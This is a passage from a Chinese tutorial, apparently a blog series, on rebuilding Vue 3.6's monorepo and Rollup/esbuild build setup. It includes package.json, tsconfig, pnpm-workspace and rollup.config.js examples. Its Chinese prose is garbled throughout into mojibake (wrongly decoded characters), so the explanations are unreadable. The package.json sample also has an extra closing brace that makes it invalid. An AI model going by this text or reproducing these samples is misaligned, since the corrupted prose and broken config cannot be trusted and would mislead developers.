<p>å…¶å†…å®¹ä¸ºæ ¹æ®å½“å‰çš„è¿è¡Œç¯å¢ƒï¼Œå¼•å…¥å¯¹åº”çš„ CommonJS ç‰ˆæœ¬æ„å»ºäº§ç‰©ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">'use strict'</span>

<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>) {
  <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./dist/shared.cjs.prod.js'</span>)
} <span class="hljs-keyword">else</span> {
  <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./dist/shared.cjs.js'</span>)
}
</code></pre>
<p>ç•™æ„åœ¨è¿™ç±» CommonJS å…¥å£æ–‡ä»¶ä¸­ï¼ŒVue éƒ½å¯¹å®ƒä»¬å¯ç”¨äº†ä¸¥æ ¼æ¨¡å¼ï¼ˆ<code>'use strict'</code>ï¼‰ï¼Œè¿™æ˜¯ä¸ºäº†ç¡®ä¿ä»£ç èƒ½åŠæ—¶æš´éœ²ä¸€äº›æ½œåœ¨çš„é—®é¢˜ï¼ˆä¾‹å¦‚ä½¿ç”¨æœªå£°æ˜çš„å˜é‡ï¼‰ï¼Œå¹¶æå‡ä»£ç çš„è´¨é‡å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<blockquote>
<p>ğŸ’¡ ä¸¥æ ¼æ¨¡å¼åœ¨ ESM é‡Œæ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå› æ­¤ ESM æ¨¡å—é‡Œæ— éœ€æ ‡è®° <code>'use strict'</code>ã€‚</p>
</blockquote>
<h4 data-id="heading-7">npm åŒ…é…ç½®æ–‡ä»¶</h4>
<p><code>shared/package.json</code> æ˜¯ <code>shared</code> æ¨¡å—çš„ npm åŒ…é…ç½®æ–‡ä»¶ï¼Œå…¶èŒè´£ä¸åªæ˜¯æä¾›ã€Œnpm å‘å¸ƒæè¿°ã€ï¼Œè¿˜åŒ…å«äº†å·¥ç¨‹åŒ–ç›¸å…³çš„é…ç½®ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** shared/package.json **/</span>

{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"@vue/shared"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"3.6.0"</span>,
  <span class="hljs-string">"main"</span>: <span class="hljs-string">"index.js"</span>,                     <span class="hljs-comment">// æŒ‡å®š CommonJS ç”Ÿæ€ä¸‹çš„ä¼ ç»Ÿå…¥å£ï¼Œä¸»è¦ç”¨äº ä¸æ”¯æŒ exports çš„æ—§ NodeJS / å·¥å…·é“¾</span>
  <span class="hljs-string">"module"</span>: <span class="hljs-string">"dist/shared.esm-bundler.js"</span>, <span class="hljs-comment">// æŒ‡å®š ESM bundler ç”Ÿæ€ä¸‹çš„å…¥å£</span>
  <span class="hljs-string">"types"</span>: <span class="hljs-string">"dist/shared.d.ts"</span>,            <span class="hljs-comment">// æŒ‡å®šç±»å‹å£°æ˜æ–‡ä»¶</span>
  <span class="hljs-string">"files"</span>: [                              <span class="hljs-comment">// æŒ‡å®šäº†åœ¨å‘å¸ƒåˆ° npm æ—¶ï¼Œå“ªäº›æ–‡ä»¶ä¼šè¢«åŒ…å«åœ¨å‘å¸ƒåŒ…ä¸­ï¼ˆé¿å…å°† srcã€æµ‹è¯•ä»£ç ã€æ„å»ºè„šæœ¬ç­‰æ— å…³å†…å®¹å‘å¸ƒåˆ° npmï¼‰</span>
    <span class="hljs-string">"index.js"</span>,
    <span class="hljs-string">"dist"</span>
  ],
  <span class="hljs-string">"exports"</span>: {                            <span class="hljs-comment">// æ›´ä¸ºå®Œå–„çš„æ–°è§„èŒƒå…¥å£é…ç½®å­—æ®µ</span>
    <span class="hljs-string">"."</span>: {
      <span class="hljs-string">"types"</span>: <span class="hljs-string">"./dist/shared.d.ts"</span>,                 <span class="hljs-comment">// æŒ‡å®šç±»å‹å£°æ˜æ–‡ä»¶</span>
      <span class="hljs-string">"node"</span>: {                                      <span class="hljs-comment">// ä¼ ç»Ÿ NodeJSï¼ˆCommonJSï¼‰ï¼Œå¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒå¯¹åº”çš„å…¥å£</span>
        <span class="hljs-string">"production"</span>: <span class="hljs-string">"./dist/shared.cjs.prod.js"</span>,
        <span class="hljs-string">"development"</span>: <span class="hljs-string">"./dist/shared.cjs.js"</span>,
        <span class="hljs-string">"default"</span>: <span class="hljs-string">"./index.js"</span>
      },
      <span class="hljs-string">"module"</span>: <span class="hljs-string">"./dist/shared.esm-bundler.js"</span>,      <span class="hljs-comment">// ESM bundler å…¥å£ï¼ˆç”¨äºéƒ¨åˆ†æ„å»ºå·¥å…·è¯†åˆ«ï¼‰</span>
      <span class="hljs-string">"import"</span>: <span class="hljs-string">"./dist/shared.esm-bundler.js"</span>,      <span class="hljs-comment">// ESM bundler å…¥å£ï¼ˆç”¨äº NodeJS ä¾§è¯†åˆ«ï¼‰</span>
      <span class="hljs-string">"require"</span>: <span class="hljs-string">"./index.js"</span>                        <span class="hljs-comment">// ä¼ ç»Ÿ CommonJS é»˜è®¤å…¥å£ï¼ˆå…œåº•ï¼‰</span>
    },
    <span class="hljs-string">"./*"</span>: <span class="hljs-string">"./*"</span>                                     <span class="hljs-comment">// æŒ‡å®šå¯è®¿é—®çš„å­è·¯å¾„æ˜ å°„</span>
  },
  <span class="hljs-string">"sideEffects"</span>: <span class="hljs-literal">false</span>          <span class="hljs-comment">// å£°æ˜è¯¥åŒ…åœ¨æ¨¡å—ã€åˆå§‹åŒ–é˜¶æ®µã€‘ä¸å­˜åœ¨å‰¯ä½œç”¨ï¼Œå½“æ¨¡å—çš„å¯¼å‡ºæœªè¢«ä½¿ç”¨æ—¶ï¼Œæ•´ä¸ªæ¨¡å—å¯è¢«å‰”é™¤ï¼ˆTree-shakingï¼‰</span>
  }
}
</code></pre>
<p>å…¶ä¸­ <code>main</code>ã€<code>module</code> å’Œ <code>types</code> ä¸‰ä¸ªå­—æ®µæ˜¯ä¸ºäº†å…¼å®¹æ—§ç”Ÿæ€æ‰€ä¿ç•™çš„çº¦å®šå¼å…¥å£ï¼Œ<code>exports</code> åˆ™æ˜¯æ›´ä¸ºå®Œå–„çš„æ–°è§„èŒƒå­—æ®µï¼ˆå¯ä»¥æŒ‡å®šæ›´ç»†ç²’åº¦çš„å…¥å£æ˜ å°„ï¼‰ï¼Œç°ä»£ NodeJS æˆ–æ„å»ºå·¥å…·ä¼šä¼˜å…ˆé‡‡ç”¨ <code>exports</code> å­—æ®µæŒ‡å®šçš„å…¥å£ã€‚</p>
<h3 data-id="heading-8">2.3 Monorepo æ¨¡å—ä¹‹é—´çš„è”ç³»</h3>
<h4 data-id="heading-9">æ–°å»º reactivity æ¨¡å—</h4>
<p>ä¸ºäº†æ›´å¥½åœ°äº†è§£ Monorepo ä¸‹å„ç‹¬ç«‹æ¨¡å—ä¹‹é—´çš„è”ç³»ï¼Œæˆ‘ä»¬ä»¿ç…§ <code>shared</code> æ¨¡å—çš„ç»“æ„ï¼Œåœ¨ <code>packages</code> ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º <code>reactivity</code> çš„å“åº”å¼æ¨¡å—ï¼š</p>
<pre><code class="hljs language-js" lang="js">vue
â”œâ”€â”€ packages
â”‚   â”œâ”€â”€ reactivity        <span class="hljs-comment">// æ–°å¢å“åº”å¼æ¨¡å—æ–‡ä»¶å¤¹</span>
â”‚   â”‚   â”œâ”€â”€ src           <span class="hljs-comment">// å­˜æ”¾å®é™…æºç </span>
â”‚   â”‚   â”‚   â”œâ”€â”€ reactive.<span class="hljs-property">ts</span>
â”‚   â”‚   â”‚   â””â”€â”€ index.<span class="hljs-property">ts</span>
â”‚   â”‚   â”œâ”€â”€ package.<span class="hljs-property">json</span>  <span class="hljs-comment">// npm åŒ…é…ç½®</span>
â”‚   â”‚   â””â”€â”€ index.<span class="hljs-property">ts</span>      <span class="hljs-comment">// åŒ…å…¥å£</span>
</code></pre>
<blockquote>
<p><code>reactivity</code> ä¸‹å„æ–‡ä»¶çš„å†…å®¹å’Œ <code>shared</code> çš„åŸºæœ¬ä¸€è‡´ã€‚</p>
</blockquote>
<p>ç›®å‰æˆ‘ä»¬ä»…æ‰“ç®—æ­å»ºä¸€ä¸ªé¡¹ç›®é›å½¢ï¼Œå› æ­¤ <code>reactivity</code> æ¨¡å—çš„å†…å®¹å°½é‡ç®€å•åŒ–ï¼Œå…¶ä¸­ <code>src/reactive.ts</code> çš„ä»£ç ä»…ç”¨æ¥æ¨¡æ‹Ÿ <code>shared</code> æ¨¡å—æ¥å£çš„å¼•å…¥å’Œå¯¼å‡ºï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** src/reactive.ts **/</span>

<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'@vue/shared'</span>  <span class="hljs-comment">// ä»…ç”¨äºè°ƒè¯•</span>
</code></pre>
<p>æ­¤æ—¶ä½ ä¼šçœ‹åˆ° IDE ä¸­ä¼šæ ‡çº¢æŠ¥é”™ï¼Œæç¤º TypeScript æ‰¾ä¸åˆ° <code>@vue/shared</code> æ¨¡å—ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6e3e463f9e347dea39da1e52b0bfc36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770436218&amp;x-signature=A6WS3Dn6RhQ7NH%2BhI%2BRA452vKOo%3D" alt="p1.png" loading="lazy"/></p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>vue</code> æ ¹ç›®å½•ä¸‹æ–°å¢ <code>tsconfig.json</code> æ–‡ä»¶ï¼Œç”¨äºé…ç½® TypeScript çš„ç¼–è¯‘é€‰é¡¹ï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"compilerOptions"</span>: {
    <span class="hljs-string">"strict"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"rootDir"</span>: <span class="hljs-string">"."</span>,
    <span class="hljs-string">"paths"</span>: {                            <span class="hljs-comment">// IDE ç±»å‹æ£€æŸ¥è·¯å¾„</span>
      <span class="hljs-string">"@vue/*"</span>: [<span class="hljs-string">"./packages/*/src"</span>],     <span class="hljs-comment">// æŠŠ @vue/xxx æ˜ å°„åˆ° packages/xxx/src ä¸‹</span>
      <span class="hljs-string">"*"</span>: [<span class="hljs-string">"./*"</span>]
    }
  },
  <span class="hljs-string">"include"</span>: [
    <span class="hljs-string">"packages/*/src"</span>,
  ]
}
</code></pre>
<p>æ­¤æ—¶ <code>src/reactive.ts</code> ä¸­ä¸å†æ ‡çº¢æŠ¥é”™ï¼ŒIDE çš„ TypeScript ç±»å‹æ£€æŸ¥åŠŸèƒ½å·²å¯æˆåŠŸè¯†åˆ«åˆ° <code>@vue/shared</code> æ¨¡å—ã€‚</p>
<h4 data-id="heading-10">pnpm çš„ <code>workspace</code> åè®®</h4>
<p>å¦‚åŒ<a href="#md-monorepo" title="#md-monorepo">ã€Œ2.1 Vue ä¸­çš„ Monorepoã€</a>æ‰€æåŠçš„ï¼Œ<code>@vue/reactivity</code> éœ€è¦è¢«ç‹¬ç«‹å‘å¸ƒåˆ° npm ä¸Šï¼ˆä¾›å¼€å‘è€…ä¸‹è½½ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºå…¶å£°æ˜å¯¹ <code>@vue/shared</code> npm åŒ…çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** reactivity/package.json **/</span>

{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"@vue/reactivity"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"3.6.0"</span>,
  <span class="hljs-string">"main"</span>: <span class="hljs-string">"index.js"</span>,
  <span class="hljs-string">"module"</span>: <span class="hljs-string">"dist/reactivity.esm-bundler.js"</span>,
  <span class="hljs-comment">// ç•¥...ï¼ˆå’Œ shared/package.json åŸºæœ¬ä¸€è‡´ï¼‰</span>

  <span class="hljs-string">"dependencies"</span>: {                 <span class="hljs-comment">// è¡¥å……å¯¹ shared æ¨¡å—çš„ä¾èµ–ä¿¡æ¯</span>
    <span class="hljs-string">"@vue/shared"</span>: <span class="hljs-string">"3.6.0"</span>
  }
}
</code></pre>
<p>ç„¶è€Œè¿™é‡Œæ‰€å¡«å…¥çš„ <code>@vue/shared</code> ç‰ˆæœ¬å· <code>3.6.0</code> å­˜åœ¨ä¸€ä¸ªé—®é¢˜ â€”â€” è¯¥è¿œç¨‹ç‰ˆæœ¬çš„å†…å®¹å¹¶éæˆ‘ä»¬æœ¬åœ°ä¸Šæœ€æ–°çš„ <code>packages/shared</code> ä¸‹çš„å†…å®¹ï¼Œä¸”æ¯æ¬¡å‘å¸ƒ npm åŒ…ä¹‹å‰éƒ½éœ€è¦æ‰‹åŠ¨æ›´æ–°è¯¥ä¾èµ–åŒ…çš„ç‰ˆæœ¬å·ï¼Œä¸€æ—¦é—æ¼å°±ä¼šå‡ºé”™ã€‚</p>
<p>pnpm å®˜æ–¹æä¾›äº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œå³ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpnpm.io%2Fworkspaces" target="_blank" title="https://pnpm.io/workspaces" ref="nofollow noopener noreferrer"><code>workspace</code> åè®®</a>æ¥æ›¿æ¢ä¾èµ–åŒ…çš„ç‰ˆæœ¬å·ï¼Œå®ƒè¡¨ç¤ºè¯¥ä¾èµ–å¿…é¡»è§£æè‡ªå½“å‰ Monorepo ä¸­å£°æ˜çš„ workspace åŒ…ï¼Œè€Œä¸ä¼šä»è¿œç¨‹ npm registry ä¸‹è½½ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** reactivity/package.json **/</span>

  <span class="hljs-string">"dependencies"</span>: {      
    <span class="hljs-string">"@vue/shared"</span>: <span class="hljs-string">"workspace:*"</span>     <span class="hljs-comment">// æ›´æ›¿ä¸º workspace åè®®</span>
  }
</code></pre>
<p>å¦å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€åœ¨ <code>vue</code> æ ¹ç›®å½•ä¸‹æ–°å¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpnpm.io%2Fpnpm-workspace_yaml" target="_blank" title="https://pnpm.io/pnpm-workspace_yaml" ref="nofollow noopener noreferrer"><code>pnpm-workspace.yaml</code> æ–‡ä»¶</a>ï¼Œç”¨äºå‘ŠçŸ¥ pnpmã€Œå“ªäº›æ–‡ä»¶å¤¹å¯ä»¥ä½œä¸ºç‹¬ç«‹çš„ workspaceã€ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** pnpm-workspace.yaml **/</span>

<span class="hljs-attr">packages</span>:
  - <span class="hljs-string">"packages/*"</span>  <span class="hljs-comment">// æŠŠ packages æ–‡ä»¶å¤¹é‡Œçš„æ¯ä¸€ä¸ªä¸€çº§å­ç›®å½•ï¼Œéƒ½å½“ä½œä¸€ä¸ªç‹¬ç«‹çš„ workspace åŒ…</span>
</code></pre>
<p>pnpm åœ¨æ‰§è¡Œæ—¶ä¼šæ‰«æ <code>pnpm-workspace.yaml</code> ä¸­æ‰€é…ç½®çš„ç›®å½•ï¼Œå¹¶å°†å…¶ä¸­åŒ…å« <code>package.json</code> çš„å­ç›®å½•æ³¨å†Œä¸º workspace æˆå‘˜ï¼Œåç»­åœ¨è§£æ <code>workspace:*</code> æ—¶ï¼Œä¼šä»è¿™äº› workspace æˆå‘˜ä¸­è¿›è¡Œæ£€ç´¢å’ŒåŒ¹é…ã€‚</p>
<p>åœ¨ç»è¿‡è¿™ç•ªé…ç½®åï¼Œé€šè¿‡ <code>pnpm publish</code> æŒ‡ä»¤æ¥å‘å¸ƒ <code>@vue/reactivity</code> åŒ…æ—¶ï¼Œpnpm ä¼šæŠŠå°†è¦æäº¤åˆ° npm registry çš„ manifest ä¸­çš„ <code>@vue/shared</code> ä¾èµ–åŒ…ç‰ˆæœ¬å·ï¼Œå¡«å†™ä¸ºæœ¬åœ°å¯¹åº” workspace æˆå‘˜ <code>packages.json</code>ï¼ˆå³ <code>packages/shared/package.json</code>ï¼‰ä¸­çš„ç‰ˆæœ¬å·ã€‚</p>
<h2 data-id="heading-11">3ã€æ„å»ºç³»ç»Ÿé›å½¢</h2>
<p>åœ¨ç†è§£äº† Vue 3.6 çš„ Monorepo ç»“æ„ä¸åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»ä¹‹åï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦å®ç°ä¸€ä¸ªåŸºç¡€çš„æ„å»ºç³»ç»Ÿï¼Œå°†åˆ†æ•£åœ¨ <code>packages/*/src</code> ç›®å½•ä¸‹çš„æºç ï¼Œæ„å»ºå‡º<a href="#md-dist" title="#md-dist">é¢„æœŸçš„å„ç‰ˆæœ¬</a>å¹¶æ”¾ç½®åœ¨ <code>packages/*/dist</code> ä¸­ï¼‰ã€‚</p>
<h3 data-id="heading-12">3.1 æŠ€æœ¯é€‰å‹</h3>
<p>Vue ä½¿ç”¨äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Frollupjs.org%2F" target="_blank" title="https://rollupjs.org/" ref="nofollow noopener noreferrer">Rollup</a> ä½œä¸ºã€Œç”Ÿäº§æ„å»ºå™¨ã€ï¼Œå¼€å‘æ€çš„å¿«é€Ÿæ„å»ºåˆ™é‡‡ç”¨çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fesbuild.github.io%2F" target="_blank" title="https://esbuild.github.io/" ref="nofollow noopener noreferrer">esbuild</a>ã€‚</p>
<h4 data-id="heading-13">ç”Ÿäº§æ„å»ºé€‰æ‹© Rollup çš„åŸå› </h4>
<p>Rollup è‡ªè¯ç”Ÿä»¥æ¥å°±æ˜¯ä¸ºäº†æ‰“åŒ… JavaScript åº“è€Œè®¾è®¡çš„ï¼š</p>
<ul>
<li><strong>Tree-shaking çš„æè‡´ä¼˜åŒ–</strong> â€”â€” Rollup åŸºäº ES Modules (ESM)ï¼Œå®ƒèƒ½ç”Ÿæˆéå¸¸ã€Œæ‰å¹³ã€çš„è¾“å‡ºä»£ç ï¼Œè¿›è€Œç¡®ä¿å†—ä½™ä»£ç èƒ½è¢«ç²¾ç¡®è£å‰ªã€è¾“å‡ºå†…å®¹è¶³å¤Ÿå¹²å‡€ã€‚</li>
<li><strong>ä½œç”¨åŸŸæå‡ï¼ˆScope Hoistingï¼‰</strong> â€”â€” Rollup é»˜è®¤ä¼šå°†æ‰€æœ‰æ¨¡å—æå‡åˆ°åŒä¸€ä¸ªä½œç”¨åŸŸå†…ï¼Œè¿™ä¸ä»…è¿›ä¸€æ­¥å‡å°äº†ä»£ç ä½“ç§¯ï¼Œè¿˜èƒ½æé«˜æ‰§è¡Œæ€§èƒ½ã€‚</li>
<li><strong>å¤šæ ¼å¼è¾“å‡ºæ”¯æŒ</strong> â€”â€” Rollup çš„æ’ä»¶ç³»ç»Ÿå’Œé…ç½®æœºåˆ¶ï¼Œå¯ä»¥é«˜æ•ˆåœ°æ„å»ºå‡º Vue çš„å¤šç‰ˆæœ¬äº§ç‰©ï¼š
<ul>
<li><code>esm-bundler</code> (ç»™ Vite / Webpack ç”¨)ï¼›</li>
<li><code>esm-browser</code> (ç»™æµè§ˆå™¨ <code>&lt;script type="module"&gt;</code> ç”¨)ï¼›</li>
<li><code>cjs</code> (CommonJS è¯­æ³•ï¼Œç»™ NodeJS ç¯å¢ƒç”¨)ï¼›</li>
<li><code>global</code> (ä¼ ç»Ÿçš„ <code>&lt;script&gt;</code> å¼•å…¥) ã€‚</li>
</ul>
</li>
</ul>
<p>æœ€é‡è¦çš„æ˜¯ï¼ŒVue éœ€è¦è¢«æ„å»ºä¸ºä¸€ä¸ªã€Œé€šç”¨çš„å‰ç«¯æ¡†æ¶åº“ã€ï¼Œè€Œä¸æ˜¯è¢«æ„å»ºä¸ºä¸€ä¸ªã€ŒWeb åº”ç”¨ã€ï¼Œå› æ­¤éœ€è¦å°½å¯èƒ½åœ°ä¿è¯è¾“å‡ºä»£ç çš„å¯é˜…è¯»æ€§ã€‚ç›¸æ¯” Webpack ä¼šåœ¨æ¯ä¸ªæ¨¡å—å‘¨å›´åŒ…è£¹å¤§é‡çš„ <code>__webpack_require__</code> ç­‰è¿è¡Œæ—¶ä»£ç ï¼ŒRollup è¾“å‡ºçš„ä»£ç æ›´åŠ ã€ŒåŸæ±åŸå‘³ã€ã€æ˜“äºä½¿ç”¨è€…é˜…è¯»å’Œè°ƒè¯•ã€‚</p>
<h4 data-id="heading-14">å¼€å‘æ„å»ºé€‰æ‹© esbuild çš„åŸå› </h4>
<p>è™½ç„¶ Rollup äº§ç‰©ç²¾ç¾ï¼Œä½†åœ¨é€Ÿåº¦ä¸Šå®ƒå¹¶ä¸æ˜¯æœ€å¿«çš„ã€‚</p>
<p>åœ¨å¼€å‘ã€è°ƒè¯•åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å¯¹äºæ„å»ºé€Ÿåº¦çš„éœ€æ±‚è¦è¿œé«˜äºæè‡´æ€§èƒ½çš„éœ€æ±‚ï¼Œè€Œ esbuild éå¸¸å¥‘åˆè¿™ä¸€åœºæ™¯ï¼š</p>
<ul>
<li><strong>æé€Ÿçš„å¢é‡æ„å»º</strong> â€”â€” esbuild é‡‡ç”¨äº†åŸºäº Go è¯­è¨€çš„ç¼–è¯‘åç«¯ï¼Œç¼–è¯‘é€Ÿåº¦éå¸¸å¿«ï¼Œèƒ½å¤Ÿåœ¨æ¯«ç§’çº§å®Œæˆå¢é‡æ„å»ºï¼Œé€‚åˆé¢‘ç¹æ”¹åŠ¨æºç ã€å¿«é€Ÿçœ‹æ•ˆæœçš„ watch å¼€å‘ã€‚</li>
<li><strong>ç®€å•çš„é…ç½®</strong> â€”â€” esbuild çš„é…ç½®é€‰é¡¹éå¸¸ç®€å•ï¼Œæ— éœ€å¤æ‚çš„æ’ä»¶ç³»ç»Ÿå³å¯å®ç°åŸºæœ¬çš„æ„å»ºéœ€æ±‚ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œè™½ç„¶ esbuild çš„è¾“å‡ºä»£ç ä¸å¤Ÿå®Œç¾ï¼ˆä¾‹å¦‚ Tree-Shaking æ²¡æœ‰ Rollup æè‡´ï¼‰ï¼Œä½†éå¸¸é€‚ç”¨äºåœ¨å¼€å‘åœºæ™¯ä¸­ç”¨äºå“åº”è¿…é€Ÿçš„ã€Œç²—åŠ å·¥ã€ã€‚</p>
<blockquote>
<p>ğŸ’¡ è¯»è€…éœ€æ³¨æ„åŒºåˆ†å„ç±»æ„å»ºé¢å‘çš„ä¸»ä½“å¯¹è±¡ â€”â€” Vue æºç é¡¹ç›®çš„ã€Œç”Ÿäº§æ„å»ºã€æ˜¯é¢å‘ Vue æ¡†æ¶ä½¿ç”¨è€…çš„ï¼Œå› æ­¤ã€Œç”Ÿäº§æ„å»ºã€çš„äº§ç‰©åŒ…æ‹¬äº†ä½¿ç”¨è€…åœ¨å…¶<strong>ç”Ÿäº§ç¯å¢ƒ</strong>ä¸­ä½¿ç”¨çš„äº§ç‰©ï¼Œä¹ŸåŒ…æ‹¬äº†ä½¿ç”¨è€…åœ¨å…¶<strong>å¼€å‘ç¯å¢ƒ</strong>ä¸­ä½¿ç”¨çš„äº§ç‰©ï¼›è€Œ Vue æºç é¡¹ç›®çš„ã€Œå¼€å‘æ„å»ºã€åªé¢å‘ Vue æºç å¼€å‘è€…ï¼ˆä¸ä½¿ç”¨è€…æ— å…³ï¼‰ã€‚</p>
</blockquote>
<h3 data-id="heading-15">3.2 <code>shared</code> æ¨¡å—çš„ç”Ÿäº§æ„å»ºæ–¹æ¡ˆå®ç°</h3>
<h4 data-id="heading-16"><code>rollup.config.js</code> é…ç½®</h4>
<p>Vue æ˜¯é€šè¿‡æ‹¼æ¥ Rollup çš„å‘½ä»¤è¡ŒæŒ‡ä»¤æ¥æ‰§è¡Œç”Ÿäº§æ„å»ºçš„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§ <a href="https://link.juejin.cn?target=https%3A%2F%2Frollupjs.org%2Fcommand-line-interface%2F" target="_blank" title="https://rollupjs.org/command-line-interface/" ref="nofollow noopener noreferrer">Rollup å®˜æ–¹æ–‡æ¡£</a>ï¼Œå…ˆåœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ª <code>rollup.config.js</code> é…ç½®æ–‡ä»¶ï¼Œç”¨äºå‘Šè¯‰ Rollup åœ¨æ‰§è¡ŒæŒ‡ä»¤æ—¶ã€Œå¦‚ä½•æ‰“åŒ…ä¸€ä¸ª packageã€ã€‚</p>
<p>ä»¥ã€Œæ„å»ºä¸€ä¸ª <code>packages/shared/dist/shared.cjs.js</code> ä¸ºä¾‹ã€ï¼Œå…¶é…ç½®å†…å®¹å‚è€ƒå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** rollup.config.js */</span>

<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'node:path'</span>
<span class="hljs-keyword">import</span> esbuild <span class="hljs-keyword">from</span> <span class="hljs-string">'rollup-plugin-esbuild'</span>

<span class="hljs-keyword">const</span> __dirname = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'.'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>))

<span class="hljs-keyword">const</span> packageConfigs = [{
  <span class="hljs-attr">input</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/src/index.ts'</span>),

  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// æ’ä»¶</span>
    <span class="hljs-title function_">esbuild</span>({       <span class="hljs-comment">// TypeScript / JS è¯­æ³•è½¬è¯‘</span>
      <span class="hljs-attr">tsconfig</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'tsconfig.json'</span>),
      <span class="hljs-attr">minify</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">target</span>: <span class="hljs-string">'es2016'</span>,
    }),
  ],

  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">file</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'./packages/shared/dist/shared.cjs.js'</span>),
    <span class="hljs-attr">format</span>: <span class="hljs-string">"cjs"</span>,
  },
  <span class="hljs-attr">treeshake</span>: {
			<span class="hljs-attr">moduleSideEffects</span>: <span class="hljs-literal">false</span>,    <span class="hljs-comment">// å£°æ˜æ¨¡å—æ— å‰¯ä½œç”¨ï¼Œå…è®¸ Rollup å®‰å…¨åœ°è¿›è¡Œ Tree-Shaking</span>
	},
}];

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> packageConfigs
</code></pre>
<p>ç•™æ„è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fegoist%2Frollup-plugin-esbuild" target="_blank" title="https://github.com/egoist/rollup-plugin-esbuild" ref="nofollow noopener noreferrer"><code>rollup-plugin-esbuild</code></a> æ’ä»¶ï¼Œè¿™æ˜¯å› ä¸º Rollup æœ¬èº«æ˜¯æ— æ³•è¯†åˆ« TypeScript è¯­æ³•çš„ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨ esbuild æ¥å……å½“ã€Œè¯­æ³•ç¿»è¯‘å®˜ã€ï¼ŒæŠŠ TypeScript ä»£ç è½¬è¯‘ä¸º JavaScript ä»£ç ã€‚</p>
<blockquote>
<p>ğŸ’¡ esbuild åœ¨å¼€å‘æ¨¡å¼ä¸­å……å½“äº†æ„å»ºå™¨ + bundler + runner çš„è§’è‰²ï¼Œä½†åœ¨æœ¬å°èŠ‚çš„ç”Ÿäº§æ„å»ºä¸­è¢«é™çº§ä¸ºä¸€ä¸ªç¼–è¯‘å™¨æ’ä»¶ã€‚</p>
<p>ğŸ’¡ è¯»è€…è¯·è‡ªè¡Œå®‰è£… <code>rollup</code>ã€<code>typescript</code>ã€<code>rollup-plugin-esbuild</code> ç­‰ npm ä¾èµ–åŒ…ï¼Œæœ¬ç³»åˆ—æ–‡ç« ä¸ä¼šæåŠä¾èµ–åŒ…çš„å®‰è£…ã€‚</p>
</blockquote>
<p>æ­¤æ—¶æ‰§è¡Œ <code>rollup -c</code> å³å¯æ„å»ºå‡º <code>packages/shared/dist/shared.cjs.js</code> æ–‡ä»¶ã€‚</p>
